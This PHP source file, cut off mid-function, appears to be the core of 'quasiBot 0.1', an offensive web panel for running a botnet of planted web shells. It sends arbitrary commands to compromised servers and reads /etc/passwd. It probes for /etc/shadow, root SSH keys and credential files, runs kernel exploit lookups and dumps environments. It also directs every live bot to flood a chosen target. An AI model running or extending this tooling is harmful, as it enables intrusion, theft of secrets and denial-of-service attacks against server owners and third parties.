<?php

/*

quasiBot 0.1 - config file

Todo:
 - Authorization system
 - Move Linux Exploit Suggestor to PHP language
 - Add Windows support to 'PWN' module
 - Automatic attacks on servers
 - Backdoors creation (backconnects)
 - Source code cleanup, it's still pretty shitty
 - ???

 ~Smash_

*/

set_time_limit(0);
error_reporting(E_ALL);

// Proxy -  Default TOR connection - 127.0.0.1:9050
define('USE_PROXY', 0); //0 - No proxy, 1 - Use proxy
define('PROXY_IP', '127.0.0.1');
define('PROXY_PORT', '9050');

// SQL Connection
define('SQL_HOST', 'localhost');
define('SQL_USER', 'root');
define('SQL_PWD', 'fuckyou');
define('SQL_DB', 'quasibot');rss()

//Misc
define('LEX', 'lex.pl'); //Linux Exploit Suggester filename
define('NMAP', 'nmap'); // Nmap path to file or executable
define('CHECKSQL', 1); //Determine whenever mysql connection should be checked
define('PWN_PHP_METHOD', 'system'); //Determine php function being used in PWN

//Functions

function checksql() {
if(CHECKSQL == 1) {
$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
if(!$conn) {
	die('Could not connect to sql - '.mysql_error());
} else {
if (!mysql_select_db(SQL_DB)) {
    echo('[+] Creating database '.SQL_DB.'<br />');
    mysql_query('CREATE DATABASE '.SQL_DB);
    mysql_select_db(SQL_DB);
}
if(mysql_num_rows(mysql_query('SHOW TABLES LIKE "bots"'))!=1) {
	echo '[+] Creating tables';
	//mysql_query('CREATE TABLE auth(login CHAR(30), pwd CHAR(255))');
	mysql_query('CREATE TABLE bots(id MEDIUMINT NOT NULL AUTO_INCREMENT, url CHAR(200) NOT NULL, PRIMARY KEY (id))');
}
}
mysql_close($conn);
}
}


function conn($url) {

$ua = array('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-fr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; es-es) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
'Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b3) Gecko/20090305',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092816',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008090713',
'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36');
$agent = $ua[array_rand($ua)];

$ch = curl_init($url);
if(USE_PROXY == 1) {
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, PROXY_IP.':'.PROXY_PORT);
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch,CURLOPT_USERAGENT, $agent);
//curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, FALSE); 
$response = curl_exec($ch);
return $response;

}

function showbots() {
$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysql_select_db(SQL_DB, $conn);

$data = mysql_query("SELECT * FROM `bots`") or die("Shits fuckd up - ".mysql_error());
echo '<table style="width: 60%; margin-left: auto; margin-right: auto; border-spacing: 5px;">';
echo '<tr><td><b>ID</b></td><td><b>URL</b></td><td><b>DDOS</b></td><td><b>STATUS</b></td></tr>';
while($row = mysql_fetch_assoc($data)) {
    
$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$status = 'OK';
} else {
$status = 'BAD';
}
if(strpos($source, md5("#666#".date("h:d")))) {
    $statdos = 'OK';
} else {
    $statdos = 'BAD';
}
    
echo '<tr><td>'.$row["id"].'.</td><td>'.$row["url"].'</td><td>'.$status.'</td><td>'.$statdos.'</td></tr>';
}
echo '</table>';

if(isset($_POST['addurl'])) {

if(mysql_query("INSERT INTO bots(url) VALUES ('".mysql_escape_string($_POST['addurl'])."')"))
echo '<br/><p>Shell added - '.htmlspecialchars($_POST['addurl']).'</p>';
} 
elseif(isset($_POST['rmurl'])) {

$check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['rmurl'])." LIMIT 1");
$row = mysql_fetch_array($check);
if($row !== false) {
if(mysql_query("DELETE FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['rmurl'])." LIMIT 1"))
echo '<br/><p>Shell with id <b>'.htmlspecialchars($_POST['rmurl']).'</b> removed.</p>';
} else { echo '<br/><p>Wrong shell ID ('.$_POST['rmurl'].')</p>'; }
}
mysql_close($conn);
}

function checkbots() {

echo 'Count - ';
$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysql_select_db(SQL_DB, $conn);
$rows = mysql_query('SELECT * FROM `bots`', $conn);
echo mysql_num_rows($rows);
echo ' &nbsp;&bull;&nbsp; Current hash - '.md5("#666#".date("h:d")).' &nbsp;&bull;&nbsp; Proxy - '. PROXY_IP.':'.PROXY_PORT.'</a></p></p>';
echo '<table align="center"><tr><td><b>ID</b></td><td><b>URL</b></td><td><b>IP</b></td><td><b>STATUS</b></td><td><b>OS</b></td><td><b>RCE</b></td><td><b>PWN</b></td></tr>';
$id = 0;
while($row = mysql_fetch_assoc($rows)) {


$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5("#666#".date("h:d")))) {
$status = 'OK';
$os = explode("{:|", $source);
} else {
$os[3] = 'Not connected';
$status = 'BAD';
}
$urlp = parse_url($row['url']);
echo '<tr><td>'.$row['id'].'.</td><td><a href="'.htmlspecialchars($row['url']).'">'.htmlspecialchars($row['url']).'</a></td><td><a href="http://www.whois.com/whois/'.gethostbyname($urlp["host"]).'">'.gethostbyname($urlp["host"]).'<a></td><td>'.$status.'</td><td>'.$os[3].'</td>';
if ($status == 'OK') {
	echo '<td><a href="rce.php?id='.$row['id'].'">&bull;</a></td><td><a href="pwn.php?id='.$row['id'].'">&bull;</a></td>'; }
echo '</tr>';

}
echo '</table> ';
mysql_close($conn);

}

function mysqlm() {
    echo "<table><form action=\"\" method=\"get\" /><tr><td><b>HOST</b></td><td><b>LOGIN</b></td><td><b>PASS</b></td></tr><tr>";
    echo "<td><input type=\"text\" value='". (empty($_GET['host'])?'':htmlspecialchars($_GET['host'], ENT_QUOTES)) ."' name=\"host\" />&nbsp;</td>";
    echo "<td><input type=\"text\" value='". (empty($_GET['login'])?'':htmlspecialchars($_GET['login'], ENT_QUOTES)) ."' name=\"login\" />&nbsp;</td>";
    echo "<td><input type=\"text\" value='". (empty($_GET['pass'])?'':htmlspecialchars($_GET['pass'], ENT_QUOTES)) ."' name=\"pass\" />&nbsp;</td>";
    echo "<td><input type=\"submit\" value=\"Conn\" /></td>";
    echo "</form></tr></table>";


    if(isset($_GET['host'], $_GET['login'], $_GET['pass']) && $conn = mysql_pconnect($_GET['host'], $_GET['login'], $_GET['pass'])) {
    echo 'Connected successfully<br />...<br />';


    ob_start();
    system('mysqldump');
    $wynik = ob_get_contents();
    ob_end_clean();

    print '<br /><h2>General info</h2>';

    if(strpos($wynik, 'Usage: mysqldump [OPTIONS]')){
    print '<br /><b>Mysqldump</b> works!<br />';
    $mysqldump = 1;
    }else{
    print '<br />Mysqldump not working<br />';
    $mysqldump = 0;
    }

    $dbuser = mysql_query("SELECT USER();");
    $dbuzer = mysql_fetch_row($dbuser);
    $dbdb = mysql_query("SELECT DATABASE();");
    $dbd = mysql_fetch_row($dbdb);

    echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
    echo "Host info - ".mysql_get_host_info()."<br />";
    echo "Current user - ".$dbuzer[0]."<br />";
    echo "Current database - ".$dbd[0]."<br />";

    echo '<br /><h2>Databases</h2><br />';
    $res = mysql_query("SHOW DATABASES");

    while ($row = mysql_fetch_assoc($res)) {
        echo $row['Database'] . "<br />";
    }


    $link = mysql_connect('localhost', 'mysql_user', 'mysql_password');
    $db_list = mysql_list_dbs($link);

    while ($row = mysql_fetch_object($db_list)) {
         echo $row->Database . "<br />";
    }


    echo "<br />...<br />";
    echo "<br /><form action=\"\" method=\"post\" />";
    echo "<input type=\"text\" name=\"db\" value=\"". (empty($_POST['db'])?"Database":htmlspecialchars($_POST['db'])) ."\" />&nbsp;";
    echo "<input type=\"submit\" value=\"Show tables\" />";
    echo "</form>";

    if(isset($_POST['db'])) {
    $tabele = mysql_list_tables($_POST['db']);
    if (!$tabele) {
        echo '<br />An error has occurred - ' . mysql_error() ."<br />";
    }
    else {
       echo "<br /><p>Tables for <b>".$_POST['db']."</b> (".mysql_num_rows($tabele)."):</p>";

    while ($row = mysql_fetch_row($tabele)) {
        echo ' - '.$row[0]."<br />";
    }

    mysql_free_result($result);
    }
    }


    echo "<br />...<br />";
    echo "<br /><form action=\"\" method=\"post\" />";
    echo "<input type=\"text\" name=\"baza\" value=\"". (empty($_POST['db'])?"Database":htmlspecialchars($_POST['db'])) ."\" />&nbsp;";
    echo "<input type=\"text\" name=\"tabela\" value=\"". (empty($_POST['tabela'])?"Table":htmlspecialchars($_POST['tabela'])) ."\" />&nbsp;";
    echo "<input type=\"submit\" value=\"Show columns\" />";
    echo "</form>";

    if(isset($_POST['baza'], $_POST['tabela'])) {

    $pola = mysql_list_fields($_POST['baza'], $_POST['tabela']);
    $columns = mysql_num_fields($pola);

    echo "<br /><p>Columns for <b>".$_POST['tabela']."</b> in database <b>".$_POST['baza']."</b> (".mysql_num_fields($pola)."):</p><br />";

    for ($i = 0; $i < $columns; $i++) {
    echo ' - '.mysql_field_name($pola, $i).' ('.mysql_field_type($pola, $i).', '.mysql_field_len($pola, $i).')<br />';
    }

    }

    echo "<br />...<br />";
    echo "<br /><form action=\"\" method=\"post\" />";
    echo "<input type=\"text\" style=\"width: 250px\" name=\"query\" />&nbsp;";
    echo "<input type=\"submit\" value=\"Execute\" />";
    echo "</form>";

     if(isset($_POST['query'])) {
     
    $result = mysql_query($_POST['query']);
    if (!$result) {
        die('An error has occurred - ' . mysql_error());
    }
    echo "<br />";
    while ($row = mysql_fetch_assoc($result)) {
       
        foreach ($row as $key => $value) {
            echo $row[$key]." ";
        }
       echo "<br />";
    }

    }

    mysql_close($conn);

    } elseif(isset($_GET['host'], $_GET['login'], $_GET['pass']) && !$conn = mysql_pconnect($_GET['host'], $_GET['login'], $_GET['pass'])) {
    	echo '<p>An error occurred while connecting - ' . mysql_error().'</p>';
    }
}

function nmap($url, $args) {
    echo '<br/><h2>Nmap</h2><br/>';
    if($_POST['proxychains'] == 'yes') {
 if($ex = exec('proxychains '.NMAP.' '.escapeshellcmd($args).' '.escapeshellcmd($url), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo $rec.'<br />';
 } 
    } else {
  echo 'Nmap not installed / available.<br />';
  }
} else {
 if($ex = exec(NMAP.' '.escapeshellcmd($args).' '.escapeshellcmd($url), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo $rec.'<br />';
 } 
    } else {
  echo 'Nmap not installed / available.<br />';
  }
}
}

function dig($url) {
echo '<br/><h2>Dig</h2><br/>';
 if(system('dig '.escapeshellcmd(trim($url)), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo '<pre>'.$rec.'</pre><br />';
 } 
    } else {
  echo 'Dig not installed / available.<br />';
  }
}

function whois($url) {
echo '<br/><h2>Whois</h2><br/>';
if(exec('whois '.escapeshellcmd(trim($url)), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo $rec.'<br />';
 } 
    } else {
  echo 'Whois not installed / available.<br />';
  }
}

function scan() {

if(isset($_POST['host']) && isset($_POST['nmap']) || isset($_POST['dig']) || isset($_POST['whois'])) {
echo '<div class="post"><h2 class="title"><a href="#">Scan results</a></h2><div class="entry">';
echo '<p class="meta">Used proxychains: ';
if($_POST['proxychains'] == 'yes') {
    echo 'Yes &nbsp;&bull;&nbsp;';
} else { echo 'No &nbsp;&bull;&nbsp;'; }
echo ' Target - '.htmlspecialchars($_POST['host']).'</p>';


if($_POST['nmap'] == 'yes') {
nmap($_POST['host'], $_POST['ncmd']);
}


if($_POST['dig'] == 'yes') {
dig($_POST['host']);
}


if($_POST['whois'] == 'yes') {
whois($_POST['host']);
}

echo '</div></div>';
}
}

function quotes() {
$quotes=array("&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;  <font size='1' color='gray'>Anthony J. D'Angelo</font>","&quot;The difference between stupidity and genius is that genius has its limits&quot;  <font size='1' color='gray'>Albert Einstein</font>","&quot;As a young boy, I was taught in high school that hacking was cool.&quot;  <font size='1' color='gray'>Kevin Mitnick</font>", "&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;  <font size='1' color='gray'>Steve Wozniak</font>","&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;  <font size='1' color='gray'>Cory Doctorow</font>", "&quot;It’s hardware that makes a machine fast. It’s software that makes a fast machine slow.&quot;  <font size='1' color='gray'>Craig Bruce</font>", "&quot;The function of good software is to make the complex appear to be simple.&quot;  <font size='1' color='gray'>Grady Booch</font>", "&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Tell me what you need and I'll tell you how to get along without it.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Fuck shit up!&quot;  <font size='1' color='gray'>Smash</font>", "&quot;Once we accept our limits, we go beyond them.&quot; <font size='1' color='gray'>Albert Einstein</font>", "&quot;Listen to many, speak to a few.&quot; <font size='1' color='gray'>William Shakespeare</font>", "&quot;The robbed that smiles, steals something from the thief.&quot; <font size='1' color='gray'>William Shakespeare</font>");
$quote = $quotes[array_rand($quotes)];
echo '<p>'.$quote.'</p>';
}

function rce()
{
$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysql_select_db(SQL_DB, $conn);
if(isset($_POST['id']) && isset($_POST['cmd']) && isset($_POST['func'])) {
$check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
$row = mysql_fetch_array($check);
if($row !== false && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
echo '</div></div><div class ="post"><h2 class="title"><a href="#">Results</a></h2><div class="entry">';
echo '<p class="meta">'.$row[1].'?_='.htmlspecialchars($_POST['func']).'&__='.htmlspecialchars($_POST['cmd']).'</p>';
$x = conn($row[1].'?_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));

$y = explode("{:|", $x);
echo '<pre>'.htmlspecialchars($y[1]).'</pre>';
} else {
echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['id']).'</b></p>';
}
}
mysql_close($conn);
}

function pwn() {
                        if(isset($_POST['id']) && isset($_POST['os']))
                        {

                            $conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
                            mysql_select_db(SQL_DB, $conn);
                            $check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
                            $row = mysql_fetch_array($check);

                          //Info
                            if(isset($_POST['os']) == 'linux' && $row[1] != NULL) {

                            if(isset($_POST['info']) == 'yes') {

                                echo '</div></div><div class="post"><h2 class="title"><a href="#">Info</a></h2><div class="entry"><p class="meta"> ';
                                $v = conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.urlencode('whoami && echo \' - \' && id && echo \' - \' && uname -mrs'));
                                
                                $z = explode("{:|", $v);
                                echo $z[1].'&nbsp;&bull;&nbsp; <a href="'.$row[1].'?___=phpinfo">phpInfo</a></p>';
                                $files = array('/etc/motd', '/etc/passwd', '/etc/group', '/etc/resolv.conf', '/etc/hosts');
                                foreach($files as $file) {
                                    $x = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=cat%20'.$file);
                                    
                                    $y = explode("{:|", $x);
                                    echo '<br/><h3>'.$file.'</h3><br />';
                                    echo '<pre>'.htmlspecialchars($y[1]).'</pre>';
                                }
                            }

                            //Exploits
                            if(isset($_POST['exploit']) == 'yes') {

                            echo '</div></div><div class="post"><h2 class="title"><a href="#">Exploits</a></h2><div class="entry"><p class="meta"> Looking for exploits for kernel version</p>';

                                $v = conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.urlencode('uname -r |cut -d"-" -f1'));
                                
                                $z = explode("{:|", $v);
                            echo '<p><a href="http://www.cvedetails.com/version-search.php?vendor=linux&product=&version='.$z[1].'"> Search for vulnerabilities ('.$z[1].')</a></p>';

if(exec('perl '.LEX.' -k '.escapeshellcmd($z[1]), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo $rec.'<br />';
 } 
    } else {
  echo 'Couldn\'t execute Linux Exploit Suggester.<br />';
  }


                            echo '<br /><p><a href="http://pwnwiki.io/#!privesc/linux/index.md">More tips</a></p>';
                            }


                            //Files
                            if(isset($_POST['files']) == 'yes') {

                                echo '</div></div><div class="post"><h2 class="title"><a href="#">Files</a></h2><div class="entry"><p class="meta"> Common files for Linux system and services</p>';

$bigfiles = array('/apache/logs/access.log',
'/apache/logs/error.log',
'/bin/php.ini',
'/etc/alias',
'/etc/apache2/apache.conf',
'/etc/apache2/conf/httpd.conf',
'/etc/apache2/httpd.conf',
'/etc/apache/conf/httpd.conf',
'/etc/bash.bashrc',
'/etc/chttp.conf',
'/etc/crontab',
'/etc/crypttab',
'/etc/debian_version',
'/etc/exports',
'/etc/fedora-release',
'/etc/fstab',
'/etc/ftphosts',
'/etc/ftpusers',
'/etc/group',
'/etc/group-',
'/etc/hosts',
'/etc/http/conf/httpd.conf',
'/etc/httpd.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/httpd/httpd.conf',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/access_log',
'/etc/httpd/logs/access.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/etc/httpd/php.ini',
'/etc/http/httpd.conf',
'/etc/inetd.conf',
'/etc/inittab',
'/etc/issue',
'/etc/issue.net',
'/etc/lighttpd.conf',
'/etc/login.defs',
'/etc/mandrake-release',
'/etc/motd',
'/etc/mtab',
'/etc/my.cnf',
'/etc/mysql/my.cnf',
'/etc/openldap/ldap.conf',
'/etc/os-release',
'/etc/pam.conf',
'/etc/passwd',
'/etc/passwd-',
'/etc/password.master',
'/etc/php4.4/fcgi/php.ini',
'/etc/php4/apache2/php.ini',
'/etc/php4/apache/php.ini',
'/etc/php4/cgi/php.ini',
'/etc/php5/apache2/php.ini',
'/etc/php5/apache/php.ini',
'/etc/php5/cgi/php.ini',
'/etc/php/apache2/php.ini',
'/etc/php/apache/php.ini',
'/etc/php/cgi/php.ini',
'/etc/php.ini',
'/etc/php/php4/php.ini',
'/etc/php/php.ini',
'/etc/profile',
'/etc/proftp.conf',
'/etc/proftpd/modules.conf',
'/etc/protpd/proftpd.conf',
'/etc/pure-ftpd.conf',
'/etc/pureftpd.passwd',
'/etc/pureftpd.pdb',
'/etc/pure-ftpd/pure-ftpd.conf',
'/etc/pure-ftpd/pure-ftpd.pdb',
'/etc/pure-ftpd/pureftpd.pdb',
'/etc/redhat-release',
'/etc/resolv.conf',
'/etc/samba/smb.conf',
'/etc/security/environ',
'/etc/security/group',
'/etc/security/limits',
'/etc/security/passwd',
'/etc/security/user',
'/etc/shadow',
'/etc/shadow-',
'/etc/slackware-release',
'/etc/sudoers',
'/etc/SUSE-release',
'/etc/sysctl.conf',
'/etc/vhcs2/proftpd/proftpd.conf',
'/etc/vsftpd.conf',
'/etc/vsftpd/vsftpd.conf',
'/etc/wu-ftpd/ftpaccess',
'/etc/wu-ftpd/ftphosts',
'/etc/wu-ftpd/ftpusers',
'/logs/access.log',
'/logs/error.log',
'/opt/apache2/conf/httpd.conf',
'/opt/apache/conf/httpd.conf',
'/opt/xampp/etc/php.ini',
'/php4\php.ini',
'/php5\php.ini',
'/php\php.ini',
'/PHP\php.ini',
'/private/etc/httpd/httpd.conf',
'/private/etc/httpd/httpd.conf.default',
'/root/.bash_history',
'/root/.ssh/id_rsa',
'/root/.ssh/id_rsa.pub',
'/root/.ssh/known_hosts',
'/tmp/access.log',
'/usr/apache2/conf/httpd.conf',
'/usr/apache/conf/httpd.conf',
'/usr/etc/pure-ftpd.conf',
'/usr/lib/php.ini',
'/usr/lib/php/php.ini',
'/usr/lib/security/mkuser.default',
'/usr/local/apache2/conf/httpd.conf',
'/usr/local/apache2/httpd.conf',
'/usr/local/apache2/logs/access_log',
'/usr/local/apache2/logs/access.log',
'/usr/local/apache2/logs/error_log',
'/usr/local/apache2/logs/error.log',
'/usr/local/apache/conf/httpd.conf',
'/usr/local/apache/conf/php.ini',
'/usr/local/apache/httpd.conf',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/usr/local/apache/logs/error. og',
'/usr/local/apps/apache2/conf/httpd.conf',
'/usr/local/apps/apache/conf/httpd.conf',
'/usr/local/etc/apache2/conf/httpd.conf',
'/usr/local/etc/apache/conf/httpd.conf',
'/usr/local/etc/apache/vhosts.conf',
'/usr/local/etc/httpd/conf/httpd.conf',
'/usr/local/etc/php.ini',
'/usr/local/etc/pure-ftpd.conf',
'/usr/local/etc/pureftpd.pdb',
'/usr/local/httpd/conf/httpd.conf',
'/usr/local/lib/php.ini',
'/usr/local/php4/httpd.conf',
'/usr/local/php4/httpd.conf.php',
'/usr/local/php4/lib/php.ini',
'/usr/local/php5/httpd.conf',
'/usr/local/php5/httpd.conf.php',
'/usr/local/php5/lib/php.ini',
'/usr/local/php/httpd.conf',
'/usr/local/php/httpd.conf.php',
'/usr/local/php/lib/php.ini',
'/usr/local/pureftpd/etc/pure-ftpd.conf',
'/usr/local/pureftpd/etc/pureftpd.pdb',
'/usr/local/pureftpd/sbin/pure-config.pl',
'/usr/local/Zend/etc/php.ini',
'/usr/pkgsrc/net/pureftpd/',
'/usr/ports/contrib/pure-ftpd/',
'/usr/ports/ftp/pure-ftpd/',
'/usr/ports/net/pure-ftpd/',
'/usr/sbin/pure-config.pl',
'/var/cpanel/cpanel.config',
'/var/lib/mysql/my.cnf',
'/var/local/www/conf/php.ini',
'/var/log/access_log',
'/var/log/access.log',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/error_log',
'/var/log/error.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access.log',
'/var/log/httpd/error_log',
'/var/log/httpd/error.log',
'/var/log/messages',
'/var/log/messages.1',
'/var/log/user.log',
'/var/log/user.log.1',
'/var/www/conf/httpd.conf',
'/var/www/html/index.html',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/Volumes/webBackup/opt/apache2/conf/httpd.conf',
'/Volumes/webBackup/private/etc/httpd/httpd.conf',
'/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
'/web/conf/php.ini');

                                echo '<br /><h3>Found</h3><br />';
                                foreach($bigfiles as $file) {
                                    $x = conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.urlencode('[ -f '.$file.' ] && echo "'.md5(1337).'" || echo "'.md5(7331)).'"');
                                    
                                    $y = explode("{:|", $x);
                                    if(strpos($x, md5(1337))) {
                                        echo ' - '.$file.'<br />';
                                    }
                                }
                            }

                            //Misc
                            if(isset($_POST['misc']) == 'yes') {
                                
                                $misc = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=env');
                                $mis = explode("{:|", $misc);
                                $misc1 = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=df%20-h');
                                $mis1 = explode("{:|", $misc1);
                                $misc2 = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=ps%20lt');
                                $mis2 = explode("{:|", $misc2);
                            echo '</div></div><div class="post"><h2 class="title"><a href="#">Miscellaneous</a></h2><div class="entry"><p class="meta">The devil is in the details</p>';
                            echo '<h2>Environment</h2>';
                            echo '<pre>'.htmlspecialchars($mis[1]).'</pre>';
                            echo '<h2>HDD</h2>';
                            echo '<pre>'.htmlspecialchars($mis1[1]).'</pre>';
                            echo '<h2>Processes</h2>';
                            echo '<pre>'.htmlspecialchars($mis2[1]).'</pre>';
                            }


                        } else {
                            echo '<br /><p>Wrong shell ID.</p>';
                        }
                        }
}

function ddos() {

    if(isset($_POST['url']) && isset($_POST['time']) && isset($_POST['sup'])) {

$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysql_select_db(SQL_DB, $conn);
$rows = mysql_query('SELECT * FROM `bots`', $conn);

if($_POST['sup'] == 'kill') {
$x = 0;
while($row = mysql_fetch_assoc($rows)) {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$x++;
$ch = curl_init();
if(USE_PROXY == 1) {
$curlConfig = array(
    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'kill' => '1'
    )
);
} else {
$curlConfig = array(
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'kill' => '1'
    )
);
}
curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);
}
}
echo '<br /><p>Killed all actions for <b>'.$x.'</b> bots.</p>';

        } elseif($_POST['sup'] == 'attack') {
            $y = 0;
            while($row = mysql_fetch_assoc($rows)) {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$y++;
$ch = curl_init();
if(USE_PROXY == 1) {
$curlConfig = array(
    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'target' => $_POST['url'],
        'time'   => $_POST['time']
    )
);
} else {
$curlConfig = array(
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'target' => $_POST['url'],
        'time'   => $_POST['time']
    )
);
}
curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);
}
}
echo '<br /><p>Attacked '.$_POST['url'].' for '.$_POST['time']. ' seconds with <b>'.$y.'</b> bots.</p>';

        }

    }

}

function dos() {

    if(isset($_POST['url1']) && isset($_POST['botid1']) && isset($_POST['time1']) && isset($_POST['sup'])) {

$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysql_select_db(SQL_DB, $conn);
$check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['botid1'])." LIMIT 1");
$row = mysql_fetch_array($check);
if($row !== false) {

if($_POST['sup'] == 'kill') {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$ch = curl_init();
if(USE_PROXY == 1) {
$curlConfig = array(
    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'kill' => '1'
    )
);
} else {
$curlConfig = array(
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'kill' => '1'
